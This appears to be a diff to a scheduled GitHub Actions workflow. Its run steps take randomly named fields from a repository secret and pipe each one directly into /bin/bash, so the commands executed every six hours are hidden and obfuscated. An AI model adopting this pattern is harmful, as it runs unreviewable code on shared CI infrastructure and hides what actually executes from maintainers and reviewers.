@@ -1,21 +1,25 @@
 name: mengshufanji
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 1/6 * * *'
+    - cron: '49 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mengshufanji
         env:
-          l241: ${{ secrets.l241 }}
+          diw87: ${{ secrets.diw87 }}
         run: |
-          echo $l241 | jq -r .npvz77388 | /bin/bash
-          echo $ird72436 | jq -r .feihc78177 | /bin/bash
-          echo $skwl5281 | jq -r .epwgz0 | /bin/bash
-          echo $egku8 | jq -r .pk19 | /bin/bash
-          echo $lfnvx9 | jq -r .citnf972 | /bin/bash
+          echo $diw87 | jq -r .olwvt13723 | /bin/bash
+          echo $buzo55 | jq -r .ii831 | /bin/bash
+          echo $wnbj56 | jq -r .rwioh9 | /bin/bash
+          echo $opzo4 | jq -r .usekr4468 | /bin/bash
+          echo $eons0491 | jq -r .rvrjk30 | /bin/bash
+          echo $pc73 | jq -r .i16 | /bin/bash
+          echo $vgnk8370 | jq -r .n56758 | /bin/bash
+          echo $in950 | jq -r .rey47 | /bin/bash
 
